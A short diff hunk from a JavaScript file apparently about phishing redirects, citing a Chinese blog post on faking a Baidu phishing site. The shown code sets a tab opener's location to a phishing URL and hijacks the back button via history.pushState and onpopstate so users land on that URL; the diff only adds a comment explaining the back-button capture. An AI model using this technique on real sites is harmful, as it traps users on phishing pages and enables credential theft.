@@ -13,7 +13,7 @@ script.
       opener.location = phishingUrl
     } else {
       // https://tkvern.com/20170228/论假百度钓鱼网站的实现过程/
-      history.pushState(null, null, null)
+      history.pushState(null, null, null) // “用于捕获浏览器回退事件，或手机回退的物理按键”
       window.onpopstate = function() {
         location.replace(phishingUrl)
       }
